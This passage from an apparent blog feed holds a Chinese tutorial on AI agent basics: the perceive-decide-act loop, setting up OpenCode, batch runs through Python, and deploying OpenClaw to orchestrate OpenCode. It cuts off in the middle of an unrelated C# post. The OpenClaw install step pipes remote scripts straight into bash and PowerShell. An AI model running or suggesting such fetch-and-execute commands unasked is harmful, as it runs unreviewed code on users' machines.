的状态。</p>\n<pre><code>checkpoint_ns: \ntask: main_node:9f7c900b-0d56-927c-17fb-5d519cc85678\n    checkpoint_ns: main_node:9f7c900b-0d56-927c-17fb-5d519cc85678\n    task: sub_node:a483bfb8-bcc6-92b3-2f64-9f9e9f4fe158\n</code></pre>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 07:58</span>&nbsp;\n<a href=\"https://www.cnblogs.com/jaydenai\">JaydenAI</a>&nbsp;\n阅读(<span id=\"post_view_count\">30</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "AI 学习笔记：Agent 的基础应用",
      "link": "https://www.cnblogs.com/owlman/p/19623216",
      "published": "",
      "description": "<h2 class=\"post-title\">\n            <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/owlman/p/19623216\" id=\"cb_post_title_url\" title=\"发布于 2026-02-18 16:09\">\n    <span>AI 学习笔记：Agent 的基础应用</span>\n    \n\n</a>\n\n        </h2>\n        <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<blockquote>\n<p>[!NOTE] 笔记说明</p>\n<p>这篇笔记对应的是《[[关于 AI 的学习路线图]]》一文中所规划的第四个学习阶段。其中记录了我学习 AI Agent 的工作原理，并将其应用于实际工作场景的全过程，以及在该过程中所获得的心得体会。同样的，这些内容也将成为我 AI 系列笔记的一部分，被存储在本人 Github 上的<a href=\"https://github.com/owlman/CS_StudyNotes\" rel=\"noopener nofollow\" target=\"_blank\">计算机学习笔记库</a>中，并予以长期维护。</p>\n</blockquote>\n<h2 id=\"ai-agent-简介\">AI Agent 简介</h2>\n<p>在理解了 LLM 在生产环境中所扮演的角色之后，初学者们接下来要思考的问题是：如何让它参与到自己的实际工作中？到目前为止（截至 2026 年 2 月），这个问题最具可行性的解决方案是：构建并使用 AI Agent。</p>\n<h3 id=\"为什么需要-ai-agent\">为什么需要 AI Agent</h3>\n<p>在早期，大多数用户是通过 Web 端或移动端的即时通信应用，主要以文本聊天的方式来使用 LLM 的（例如 ChatGPT、豆包等）。这类应用本质上是基于 HTTP API 构建的人机交互界面，其主要交互模式是“输入文本—生成文本”的往返过程。我们之前在《[[LLM 的部署与测试]]》一文中基于 PyTest 框架编写的测试用例，实际上模拟的就是这种交互模式。</p>\n<p>尽管，这类应用极大地降低了 LLM 的使用门槛，使其成为了一种能惠及普通用户的智能问答工具，但 AI 所能带来的生产力也在很大程度上被局限在了这种即时通信式的交互模式中。因为在这种交互模式下，LLM 只能根据用户当前的输入来生成文本结果，无法主动访问本地环境、调用系统资源或执行实际任务。更重要的是，LLM 在这种模式下并不处于一个持续运行的控制结构之中，它只在收到请求时做出一次性响应，无法负责具体的工作流程与状态管理。</p>\n<p>试想一下，如果 LLM 已经具备了复杂的任务规划与执行能力，我们却把它限制在聊天窗口中，这岂不是太浪费了？正是为了避免这种浪费，并赋予 LLM 在特定环境中“执行操作”的能力，AI 的研究者们重新审视了 AI Agent 这一在 20 世纪 80-90 年代就已经形成体系的概念，并在工程实践领域给了它全新的实现形式。</p>\n<p>关于 AI Agent 这个概念，读者可以参考我之前在《[[关于 AI 的学习路线图]]》中推荐的《人工智能：现代方法》一书给出的定义，原文如下：</p>\n<blockquote>\n<p>An agent is anything that can perceive its environment through sensors and act upon that environment through actuators.</p>\n<p>翻译过来就是：</p>\n<p>任何能够通过传感器感知环境，并通过执行器对环境产生影响的实体，都可以称为 Agent。</p>\n</blockquote>\n<p>这个定义成为了后来所有 AI Agent 应用的理论基础。由此也可以看出，AI Agent 的核心功能并不是提升 LLM 本身的智能水平，而是赋予它与外部系统交互的能力，使其能够参与到真实的工作流程之中。从本质上来说，这其实是 AI 应用在客户端方面的一次角色转变，它现在从单纯的答题工具被转变成了一个可以参与任务执行的系统组件。在特定的应用场景中，这种架构上的转变为工作流程的自动化提供了可行的工程路径。</p>\n<h3 id=\"ai-agent-的工作原理\">AI Agent 的工作原理</h3>\n<p>下面，让我们来了解一下 AI Agent 具体是怎么工作的。在传统聊天式的 AI 应用中，我们可以将其基本的执行模式简单概括为：</p>\n<blockquote>\n<p>用户输入 → 模型推理 → 输出结果 → 结束</p>\n</blockquote>\n<p>这种执行模式本质上是一次性的请求—响应（request-response）结构。即在这种执行模式下，LLM 会在接收到用户输入后生成文本，然后就立即退出当前工作流程，不再参与后续状态管理了。AI Agent 与这类应用的核心差异就在于：它在执行模式中引入了一个可持续运行的控制循环（control loop）。这种循环结构将 LLM 从被动接收用户输入的文本生成器，转变成了用于驱动整个程序执行结构的决策组件。换言之，Agent 的存在将 AI 应用的基本执行模式从“请求—响应”转变成了下面这样一个“感知—决策—执行”的循环结构：</p>\n<blockquote>\n<p>感知环境 → 生成决策 → 执行动作 → 更新环境状态 → 再次感知</p>\n</blockquote>\n<p>这个循环结构会持续运行下去，直到任务完成或满足终止条件。从该执行模式可以看出，一个典型的 AI Agent 应用通常包含以下几个核心组件：</p>\n<ul>\n<li><strong>LLM</strong>：该组件负责理解当前任务目标、分析上下文状态并生成下一步行动决策，不负责直接执行外部操作；</li>\n<li><strong>工具接口</strong>：该组件负责将 LLM 生成的结构化指令转换为实际可执行的操作，例如：调用 API、访问数据库、读写文件、执行系统命令、触发外部服务等。它们通常由开发者定义，并通过函数调用或插件机制暴露给模型；</li>\n<li><strong>状态管理</strong>：该组件负责维护任务的中间状态，例如：当前任务进度、已执行步骤、外部环境变化、历史决策记录等。这些状态通常会被存储在内存变量、数据库、向量存储、文件系统等介质中，如果缺乏有效的状态管理机制，我们就难以构建一个真正的 Agent 应用；</li>\n<li><strong>控制器</strong>：该组件负责驱动循环、判断是否继续执行、解析模型输出、调用对应工具、处理异常与失败重试。从架构角度来看，控制器可被视为 Agent 系统的“骨架”，而 LLM 只是其中的决策模块。</li>\n</ul>\n<p>基于以上核心组件，我们就可以简单地归纳出一个 Agent 应用的工作流程，其主要步骤如下：</p>\n<ol>\n<li>接收任务目标</li>\n<li>将目标与当前状态输入 LLM</li>\n<li>LLM 输出下一步行动计划（通常为结构化格式）</li>\n<li>控制器解析输出</li>\n<li>调用相应工具执行</li>\n<li>更新状态</li>\n<li>判断是否完成任务</li>\n<li>若未完成，则进入下一轮循环</li>\n</ol>\n<p>从工程角度来看，AI Agent 是一种新的系统架构模式，它通过持续运行的控制循环，使模型能够参与真实任务的执行过程，而不仅仅是生成文本结果。</p>\n<h2 id=\"ai-agent-的使用方法\">AI Agent 的使用方法</h2>\n<p>在了解了使用 AI Agent 的必要性及其工作原理之后，接下来就可以正式开始研究如何将它运用到自己的日常工作中了。而当我们要讨论 AI Agent 在实际工作中的使用方法时，首先需要回答的问题是“它运行在哪里、由谁控制、承担什么责任”。不同的运行形态，决定了它在工程系统中的角色边界。下面，让我们按照\"运行在哪里\"这个维度分三类来介绍 AI Agent 的使用方法，以及它们在这些应用场景中所承担的任务角色。</p>\n<h3 id=\"命令行工具型-agent\">命令行工具型 Agent</h3>\n<p>对于大多数开发者而言，以命令行工具的形式使用 AI Agent 是一种更符合工程直觉的方式。它运行在熟悉的终端环境中，可以直接访问文件系统与系统命令，因此看起来类似于自动化脚本。当然了，与传统脚本不同的是，AI Agent 的内部决策路径并非预先编写，而是由 LLM 在循环结构中动态生成。这类 AI Agent 应用的典型代表是 <a href=\"https://github.com/anthropics/claude-code\" rel=\"noopener nofollow\" target=\"_blank\">Claude Code</a>，目前同类的主流应用还包括 <a href=\"https://github.com/anomalyco/opencode\" rel=\"noopener nofollow\" target=\"_blank\">OpenCode</a>、<a href=\"https://github.com/openai/codex\" rel=\"noopener nofollow\" target=\"_blank\">Codex CLI</a>、<a href=\"https://github.com/google-gemini/gemini-cli\" rel=\"noopener nofollow\" target=\"_blank\">Gemini CLI</a>、<a href=\"https://github.com/iflow-ai/iflow-cli\" rel=\"noopener nofollow\" target=\"_blank\">iFlow CLI</a> 等。下面，我们首先要做的就是：先将这些工具安装到自己所在的操作系统中。</p>\n<h4 id=\"安装与配置\">安装与配置</h4>\n<p>命令行工具型 Agent 的安装方式其实是非常简单的。因为，虽然它们各自针对 MacOS/Linux/Windows 系统提供了不同的 bash/powershell 安装脚本，或者基于 homeberw/pacman/scoop 等针对不同操作系统平台的包管理器安装命令，但基本都提供了基于 NPM 这一包管理器的跨平台安装方式。所以，读者在大多数情况下都可以按照以下步骤来安装并使用这些工具：</p>\n<ol>\n<li>\n<p>确保自己所在的操作系统中已经安装了版本在 20.0.0 之上的 Node.js 运行环境，其中自带了 NPM 包管理器；</p>\n</li>\n<li>\n<p>在管理员权限下执行<code>npm install -g &lt;agent-name&gt;@&lt;version&gt;</code>命令，在这里，<code>&lt;agent-name&gt;</code>可以通过查询相关工具的官方网站来获得，而<code>&lt;version&gt;</code>则除了可以是我们在工具官网中查到的具体版本号之外，也可以用<code>latest</code>来表示最新版本。例如，如果我们需要安装最新版本的 OpenCode，就只需要在命令行终端中使用管理员权限执行<code>npm install -g opencode@latest</code>命令即可。</p>\n</li>\n</ol>\n<p>在安装完成之后，我们就可以用 CLI 和 TUI 两种方式来使用这种命令行工具型的 Agent 了。其中，TUI 的方式已经被大家所熟知，它实际上就是一个基于命令行界面的交互式程序，运作方式类似于 Python Shell 或 Node.js REPL，拥有属于自己的独立线程。例如在安装完 OpenCode 之后，我们只需要直接在命令行终端中输入<code>opencode</code>命令（如果想延续之前与 OpenCode 的会话，还在该命令后面加上一个<code>--continue</code>或<code>-c</code>参数），就可以启动它的 TUI 界面了，具体如图 1 所示：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 1</strong>：OpenCode TUI 界面</p>\n<p>在初次进入上次界面时，我们可以对自己使用的 AI Agent 进行一些基本的配置，这些工具的配置方式基本上是大同小异的。一般来说，我们会先使用<code>/model</code>命令设置以下自己默认要使用的 LLM，例如您在图 2 中所看到的就是 OpenCode 的 LLM 选择界面：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 2</strong>：OpenCode LLM 选择界面</p>\n<p>通常情况下，在选择 LLM 之后，这些 AI Agent 会要求我们提供一个 API Key，用于在调用 LLM 时进行身份验证。这个 API key 可以通过登录我们在相应 LLM 官网的个人账户来获得。例如，我在这里选择使用的是智普的 GLM 模型，就需要登录到<a href=\"https://bigmodel.cn/\" rel=\"noopener nofollow\" target=\"_blank\">智普 AI 的官网</a>，并为 OpenCode 创建一个专属的 API Key，如图 3 所示：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 3</strong>：创建智普 AI 的 API Key</p>\n<p>接下来，我们就只需要将上述 API Key 复制到 OpenCode 提示输入 key 的位置，并选择具体要使用的 GLM 版本并确认即可。完成这些配置之后，我们就可以通过一个 AI Agent 版的“Hello World”测试来确认它是否已经可以正常工作了，如图 4 所示：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 4</strong>：OpenCode Hello World 测试</p>\n<p>如果 AI Agent 返回了类似上面这样的信息，就意味着我们已经可以开始使用它进行实际的工作了。除此之外，如果我们还想对 AI Agent 进行一些更复杂的配置，例如强制它只用中文来显示思考过程，以及回答的内容，也可以选择在自己的用户目录下为其创建一个全局的提示词文件。以 OpenCode 为例，其具体步骤如下：</p>\n<ol>\n<li>\n<p>根据自己所在的操作系统为 OpenCode 创建一个全局配置目录。在默认情况下，该目录的路径应该为<code>~/.config/opencode</code>，其中<code>~</code>表示我们的用户目录。</p>\n</li>\n<li>\n<p>在该目录下创建一个名为<code>AGENTS.md</code>的提示词文件，并在其中输入以下内容：</p>\n<pre><code class=\"language-markdown\"># Agent 配置\n\n## 语言设置\n- **默认语言**: 中文\n- **强制使用中文**: 是\n\n## 指令\n- 所有回答必须使用中文\n- 所有思考过程也显示中文\n- 除非用户明确要求使用其他语言提问，否则保持中文回答\n</code></pre>\n</li>\n</ol>\n<p>当然了，我们更多时候会希望上述提示词文件只针对当前项目有效，这可以进行更多个性化的配置。为此，我们也可以选择在该项目的根目录下打开 OpenCode TUI，然后在其中通过执行<code>/init</code>命令来创建一个针对当前项目的<code>AGENTS.md</code>文件，并将上述内容复制到该文件中即可，该命令的具体效果如图 5 所示：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 5</strong>：OpenCode 的项目初始化命令</p>\n<p>至于其他 AI Agent，虽然会在全局配置目录与提示词文件上有各自的名称，但应用的工作流/机制基本是大同小异的，用户只需简单查询一下它们的官方文档，就可以轻松做到举一反三的，例如通过快速查询 Claude Code 的官方文档，立即就会知道它的全局提示词文件路径为<code>~/.claude/claude.md</code>。</p>\n<blockquote>\n<p>顺便说一句题外话，虽然 Claude Code 在各方面都为 AI Agent 应用建立了接近于标准的工作流/机制，但考虑到其官方的某些做法会给中文用户带来诸多没必要的额外配置，我在接下来还是会以 OpenCode 为例进行说明。如果读者想切实了解 Claude Code 的某些具体用法，也可参考本文在“参考资料”一节中提供的视频教程：《Claude Code 教程》。</p>\n</blockquote>\n<h4 id=\"基本操作方式\">基本操作方式</h4>\n<p>下面，让我们来具体介绍一下命令行工具型 Agent 的基本操作方式，正如之前所说，这类命令行工具通常有 CLI 和 TUI 两种使用方式，TUI 会单独打开一个工作线程来执行交互式操作，通常用于执行一些需要使用多轮提示词交互，并确认内容的复杂任务。因此，这些 Agent 应用的 TUI 往往至少会提供“计划（plan）”和“构建（build）”两个模式（个别 Agent 还会提供”自动（auto）“之类的第三种模式，或者在模式名称上存在差异，但其在基本使用逻辑上是一致的），其中，”计划“模式通常没有执行外部命令的权限，主要用于与 LLM 执行多轮交互，并确认某一杂任务的解决方案。例如在之前展示的 OpenCode TUI 中，读者可以在其输入框的下方看到，它默认处于“构建”模式。现在，我们可以通过输入<code>&lt;tab&gt;</code>键来将其切换到“计划”模式，然后再试着让它执行“使用 Python 编写并执行一个 hello world 程序”的操作，就会得到类似图 5 的输出：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 6</strong>：OpenCode 的计划模式</p>\n<p>正如读者所见，现在 OpenCode TUI 输入框下面提示其当前处于“计划”模式，并且告诉用户自己当前不能编辑文件和执行程序，然后开始与用户讨论任务的具体解决方案。而当我们切换到“构建”模式时，OpenCode 就会直接执行这个解决方案，并输出类似图 7 的结果：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 7</strong>：OpenCode 的构建模式</p>\n<p>当然了，就上面这种仅需一句简短的提示词就可以完成的任务而言，我们实际上更适合使用 CLI 的方式来执行。这种方式允许我们在 bash/powershell 这类命令行终端程序所在的当前线程中直接执行 AI Agent，并输出结果。例如，如果我们想使用 OpenCode CLI 的方式来编写并执行上面那个 Python 程序，可以直接在命令行终端中输入<code>opencode run \"使用 Python 编写并执行一个 hello world 程序\"</code>命令，并得到类似图 8 的输出：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 8</strong>：OpenCode 的 CLI 模式</p>\n<p>如读者所见，上述命令直接在 powershell 所在的当前线程中输出了 OpenCode 的执行结果。这样做的好处，除了避免因一些简单的任务反复启动和关闭 OpenCode TUI 之外，在必要情况下还可以使用 Shell/Python 这样的脚本语言来实现对 AI Agent 应用的批量调用，例如，如果我们想使用 Python 脚本批量调用 OpenCode CLI 来执行 5 个不同的任务，就可以像下面这样编写一个简单的 Python 脚本：</p>\n<pre><code class=\"language-python\">import subprocess\n\ntasks = [\n    \"使用 Python 编写并执行一个 hello world 程序\",\n    \"使用 Python 编写并执行一个计算斐波那契数列的程序\",\n    \"使用 Python 编写并执行一个计算阶乘的程序\",\n    \"使用 Python 编写并执行一个计算素数的程序\",\n    \"使用 Python 编写并执行一个计算回文数的程序\",\n]\n\nfor task in tasks:\n    try:\n        result = subprocess.run(\n            [\"opencode\", \"run\", task],\n            capture_output=True,\n            text=True,\n            check=True,\n            timeout=120\n        )\n        print(f\"任务成功: {task}\")\n        print(result.stdout)\n    except subprocess.CalledProcessError as e:\n        print(f\"任务失败: {task}\")\n        print(e.stderr)\n    except subprocess.TimeoutExpired:\n        print(f\"任务超时: {task}\")\n</code></pre>\n<p>除了<code>opencode run</code>命令之外，我们还可以通过执行<code>opencode -h</code>命令来查看其他可用 CLI 方式执行的 OpenCode 操作，如图 9 所示：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 9</strong>：OpenCode 的 CLI 帮助信息</p>\n<p>虽然，上面这种多次调用<code>opencode run</code>命令的做法，在某些特定的情况下并不是最佳的任务编排方式。例如在某些时候，先将所有的需求写入一个 Markdown 文档中，再将其作为提示词一次性发给 AI Agent 可能会是一种更合适的做法。但是，我们可以基于这一思路发展出许多更复杂的 AI Agent 工作流，例如利用部署在服务端的 Agent 来操作这些命令行工具型的 Agent。下面，就让我们基于 OpenClaw 这一可部署服务型的 AI Agent 来了解一下这一工作流的具体实现方式。</p>\n<h3 id=\"可部署服务型-agent\">可部署服务型 Agent</h3>\n<p>如果我们将命令行工具型的 AI Agent 视为一种增强型的自动化工具，那么以 OpenClaw 为代表的、可在服务端部署的 AI Agent 则就是一种系统级执行单元，二者的差异主要在于运行形态与系统边界。具体来说就是，命令行工具型 Agent 的运行方式通常是：</p>\n<ul>\n<li>被用户触发</li>\n<li>执行一轮或多轮任务</li>\n<li>输出结果</li>\n<li>退出进程</li>\n</ul>\n<p>而可部署服务型 Agent 则具有以下完全不同的特征：</p>\n<ul>\n<li>常驻运行</li>\n<li>通过 HTTP / RPC / WebSocket 等方式对外提供能力</li>\n<li>持续维护会话状态</li>\n<li>支持多用户并发访问</li>\n<li>可以被其他系统调用</li>\n</ul>\n<p>在这种形态下，Agent 就不再是一个功能类似于自动化脚本的增强型工具了，它成为了常驻在操作系统中的一个服务组件。具体来说，如果从程序架构的角度来看，这两种 Agent 的差别主要体现在以下几个方面：</p>\n<ol>\n<li>\n<p>生命周期管理：命令行工具型 Agent 的生命周期通常是一次性的，执行完成即销毁，而可部署服务型 Agent 则具有长生命周期，需要考虑健康检查、日志管理、异常恢复机制。</p>\n</li>\n<li>\n<p>会话与状态管理：命令行工具型 Agent 的状态通常也是一次性的，而可部署服务型 Agent 则需要维护会话状态，这意味着它需要支持用户级会话隔离、长期上下文存储、记忆机制（Memory）以及外部数据库支持。</p>\n</li>\n<li>\n<p>多 Agent 编排能力：一旦 Agent 以系统服务组件的形式存在，它就可以调用其他 Agent，被其他 Agent 调用，参与更复杂的任务链。例如像这样：</p>\n<pre><code class=\"language-plaintext\">用户请求\n↓\n调度 Agent\n↓\n分析 Agent → 代码生成 Agent → 测试 Agent\n↓\n结果汇总\n</code></pre>\n<p>这种执行结构显然已经不再是单纯的工具调用，它关注的实际上已经是任务的编排与调度了。这也就意味着，我们需要在服务型的 Agent 中引入任务队列、消息队列、异步任务调度系统等机制。</p>\n</li>\n</ol>\n<p>下面，让我们以 OpenClaw 为例来具体介绍一下使用这种服务型 Agent 的一些基本工作流。假设，我们现在想使用 OpenClaw 指挥 OpenCode 来完成一个简单的网站重构任务，通常需要按照以下步骤来完成。</p>\n<h4 id=\"步骤-1安装并配置一个-openclaw-服务\">步骤 1：安装并配置一个 OpenClaw 服务</h4>\n<p>正如之前所说，OpenClaw 本质上是一个系统服务，这意味着免不了要赋予它较大的操作权限，基于安全方面的考虑，我个人不建议用户将其安装在自己日常的工作设备上。另外，如果想最大限度地发挥 OpenClaw 的功能，最好要能让它长时间持续运行，并执行一定程度的实际设备管理能力。因此，我们在安装 OpenClaw 时通常需要执行的操作如下：</p>\n<ul>\n<li>\n<p>配置好一台可与我们日常工作设备相连通的独立计算机（如果仅用于学习目的，也可以是一台虚拟机），并在其中安装好操作系统与 Node.js 22.x 以上版本的运行环境。</p>\n</li>\n<li>\n<p>在这台独立计算机上打开命令行终端，并执行<code>npm install -g openclaw@latest</code>命令来安装 OpenClaw。当然了，这是使用跨平台的方式。如果读者不想使用 NPM，也可以通过直接执行 bash/powershell 的安装脚本来完成这个操作，相关命令如下：</p>\n<pre><code class=\"language-bash\"># MacOS/Linux 系统下使用 bash 脚本安装：\ncurl -fsSL https://openclaw.ai/install.sh | bash\n# Windows 系统下使用 powershell 脚本安装：\niwr -useb https://openclaw.ai/install.ps1 | iex\n</code></pre>\n</li>\n<li>\n<p>待安装完成之后，继续执行<code>openclaw onboard --install-daemon</code>命令来启动新手安装向导（如图 10 所示），进一步安装 OpenClaw 的服务端组件（例如飞书机器人、WhatsApp 机器人等），关于这方面的内容，读者可参考本文在“参考资料”一节中提供的视频教程：《OpenClaw +飞书的工具流搭建过程》。</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 10</strong>：OpenClaw 的安装向导</p>\n</li>\n<li>\n<p>在配置完相关服务端组件之后，我们还需要通过执行如下命令来配置 OpenClaw 的 Gateway 网关：</p>\n<pre><code class=\"language-bash\">openclaw channels login\nopenclaw gateway --port 18789\n</code></pre>\n<p>在这里，<code>--port</code>参数用于指定 OpenClaw Gateway 的监听端口，如果读者希望使用默认的 18789 端口，则可以省略该参数。</p>\n</li>\n<li>\n<p>待 Gateway 启动之后，我们就可以使用浏览器打开<code>http://localhost:18789</code>来访问 OpenClaw 的 Web 端了，如果我们能看到如图 11 所示的界面，就说明 OpenClaw 已经成功安装并完成了初步的配置工作。</p>\n  \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 11</strong>：OpenClaw 的 Web 端</p>\n</li>\n</ul>\n<h4 id=\"步骤-2配置-openclaw-调用-opencode-的方式\">步骤 2：配置 OpenClaw 调用 OpenCode 的方式</h4>\n<p>截止到目前为止，我们主要有<strong>两种方式</strong>可以让 OpenClaw 使用 OpenCode 来连接 LLM 并执行指定的任务。如果用户已购买了 OpenCode 的官方模型服务（即 OpenCode Zen），可以选择直接使用 OpenClaw 自带的 Zen 插件来调用 OpenCode，这种方式的具体操作如下：</p>\n<ul>\n<li>\n<p>先获取到 OpenCode Zen 的 API Key，然后通过执行如下命令之一，将其添加到 OpenClaw 的配置中：</p>\n<pre><code class=\"language-bash\"># 使用交互式命令，这需要根据该命令的提示输入你的 API Key\nopenclaw onboard --auth-choice opencode-zen\n# 或非交互式命令，直接将 API Key 作为参数传入\nopenclaw onboard --opencode-zen-api-key \"&lt;你的 API Key&gt;\"\n</code></pre>\n</li>\n<li>\n<p>如果需要的话，还可以通过执行如下命令来设置自己要使用的默认模型：</p>\n<pre><code class=\"language-bash\">openclaw config set agents.defaults.model.primary \"opencode/claude-opus-4-6\"\n</code></pre>\n</li>\n</ul>\n<p>当然了，选择上述方式需要用户不计较按量计费所带来的开销。如果我们想使用免费的 LLM 的话（譬如  kimi-k2.5-free），也可以通过给 OpenClaw 安装 <code>opencode-to-openai</code>这样的第三方插件来实现。这第二种方式的具体操作如下：</p>\n<ul>\n<li>\n<p>安装<code>opencode-to-openai</code>插件，这需要通过执行如下命令来完成：</p>\n<pre><code class=\"language-bash\">git clone https://github.com/dxxzst/opencode-to-openai\ncd opencode-to-openai\nopenclaw plugins install .\n</code></pre>\n</li>\n<li>\n<p>安装完成后，需要执行如下命令来重启 OpenClaw，并确保插件已启用：</p>\n<pre><code class=\"language-bash\">openclaw gateway restart\n</code></pre>\n<p>在这里，如果我们在 OpenClaw 中启用了插件白名单，就还需要通过执行如下命令将该加入该白名单：</p>\n<pre><code class=\"language-bash\">openclaw config get plugins.allow --json\n# 假设返回 [\"a\",\"b\"]\n\nopenclaw config set plugins.allow '[\"a\",\"b\",\"opencode-to-openai\"]' --json\nopenclaw gateway restart\n</code></pre>\n</li>\n<li>\n<p>同步模型并认证 LLM 服务，这需要通过执行如下命令来完成：</p>\n<pre><code class=\"language-bash\">openclaw models auth login --provider opencode-to-openai --method local\n</code></pre>\n<p>如果你想顺便设置默认模型：</p>\n<pre><code class=\"language-bash\">openclaw models auth login --provider opencode-to-openai --method local --set-default\n</code></pre>\n</li>\n<li>\n<p>选择模型，这需要通过执行如下命令来完成：</p>\n<pre><code class=\"language-bash\">openclaw models set opencode-to-openai/opencode/kimi-k2.5-free\n</code></pre>\n<p>在这里，如果担心对 LLM 的请求会被卡住，也可以用<code>useIsolatedHome=false</code>这个插件配置让 OpenCode 使用真实 HOME，具体配置命令如下：</p>\n<pre><code class=\"language-bash\">openclaw config set plugins.opencode-to-openai.useIsolatedHome false\n</code></pre>\n</li>\n</ul>\n<h4 id=\"步骤-3与-openclaw-进行对话\">步骤 3：与 OpenClaw 进行对话</h4>\n<p>如果上述操作一切顺利，我们就可以在步骤 1 中配置好的 Web 端或飞书之类的应用中打开与 OpenClaw 的对话窗口，通过发送提示词来调度 OpenCode 完成相关任务了，如图 12 所示：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 12</strong>：与 OpenClaw 的对话窗口</p>\n<p>当然了，如果想让提示词发挥到最大的作用，并在生产环境中实际使用 OpenClaw/OpenCode 来完成具体的项目任务，我们还需要再配置一下 OpenClaw/OpenCode 所接入的 MCP 服务和 Agent Skills 机制了。关于这部分的内容，我将会在《[[Agent 的进阶应用]]》这一篇笔记中进行详细介绍。</p>\n<h2 id=\"结束语\">结束语</h2>\n<p>在完成了对 AI Agent 的学习与实践之后，我最为明显的体会之一是：Agent 并没有让系统变得更简单，反而让系统的边界变得更加清晰。与传统的自动化脚本或工具不同，Agent 并不是一组固定规则的集合，而是一个基于语言模型进行任务理解、规划与执行的系统组件。这意味着，在很多场景下，它所做的并不是“按预期运行”，而是“尽力完成任务”。</p>\n<p>正因如此，Agent 的引入并没有削弱人类在系统中的作用，反而对人的判断能力提出了更高要求：<br />\n我们需要能够理解 Agent 在做什么、为什么这么做，以及在什么情况下应该介入、修正甚至中止它的行为。从这个角度来看，学习和使用 AI Agent，并不意味着把控制权完全交给 AI，而是学会如何在一个由 AI 参与执行的系统中，重新定位人的职责与边界。这也正是本学习阶段的核心目标。</p>\n<h2 id=\"参考资料\">参考资料</h2>\n<ul>\n<li>\n<p>官方文档：</p>\n<ul>\n<li><a href=\"https://code.claude.com/docs/zh-CN/overview?utm_source=copilot.com\" rel=\"noopener nofollow\" target=\"_blank\">Claude Code 官方文档</a></li>\n<li><a href=\"https://opencode.doczh.com/docs/\" rel=\"noopener nofollow\" target=\"_blank\">OpenCode 官方文档</a></li>\n<li><a href=\"https://claude.com/blog/extending-claude-capabilities-with-skills-mcp-servers\" rel=\"noopener nofollow\" target=\"_blank\">基于 Agent skills 和 MCP 服务的协同工作流</a></li>\n<li><a href=\"https://docs.openclaw.ai/zh-CN\" rel=\"noopener nofollow\" target=\"_blank\">OpenClaw 官方文档</a></li>\n</ul>\n</li>\n<li>\n<p>视频教程：</p>\n<ul>\n<li>Claude Code 教程：<a href=\"https://www.youtube.com/watch?v=AT4b9kLtQCQ\" rel=\"noopener nofollow\" target=\"_blank\">YouTube 链接</a> / <a href=\"https://www.bilibili.com/video/BV14rzQB9EJj\" rel=\"noopener nofollow\" target=\"_blank\">Bilibili 链接</a></li>\n<li>OpenClaw +飞书的工具流搭建过程：<a href=\"https://www.youtube.com/watch?v=giv63OtX720\" rel=\"noopener nofollow\" target=\"_blank\">YouTube 链接</a> / <a href=\"https://www.bilibili.com/video/BV1rvcpzDEsH\" rel=\"noopener nofollow\" target=\"_blank\">Bilibili 链接</a></li>\n</ul>\n</li>\n</ul>\n\n\n</div>\n<div class=\"clear\"></div>\n\n        <p class=\"postfoot\">\n            posted on \n<span id=\"post-date\">2026-02-18 16:09</span>&nbsp;\n<a href=\"https://www.cnblogs.com/owlman\">凌杰</a>&nbsp;\n阅读(<span id=\"post_view_count\">146</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n\n        </p>"
    },
    {
      "title": ".NET 10 & C# 14 New Features 新增功能介绍-扩展成员Extension Members",
      "link": "https://www.cnblogs.com/tianqing/p/19622970",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/tianqing/p/19622970\" id=\"cb_post_title_url\" title=\"发布于 2026-02-18 11:20\">\n    <span>.NET 10 &amp; C# 14 New Features 新增功能介绍-扩展成员Extension Members</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p class=\"p1\"><span class=\"s1\">C# 14 引入了对扩展成员（Extension Members）的增强支持，本质上是对传统“扩展方法”模型的一次语言级升级，使其可以定义的不再仅限于方法，</span></p>\n<p class=\"p1\"><span class=\"s1\">而是可以扩展更多成员形态（例如属性、运算符等）。</span></p>\n<p class=\"p1\"><strong><span class=\"s1\" style=\"font-size: 16px;\">一、从扩展方法到扩展成员</span></strong></p>\n<p class=\"p1\">早在 <a><span class=\"s1\">C# 3.0</span></a> 中，就引入了“扩展方法（Extension Methods）”，其底层机制是：</p>\n<ul>\n<li>\n<p class=\"p1\"><span class=\"s1\">必须定义在 static class</span></p>\n</li>\n<li>\n<p class=\"p1\">方法必须是 <span class=\"s1\">static</span></p>\n</li>\n<li>\n<p class=\"p1\">第一个参数使用 <span class=\"s1\">this T</span></p>\n</li>\n</ul>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">public</span> <span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">class</span><span style=\"color: rgba(0, 0, 0, 1);\"> StringExtensions\n{\n    </span><span style=\"color: rgba(0, 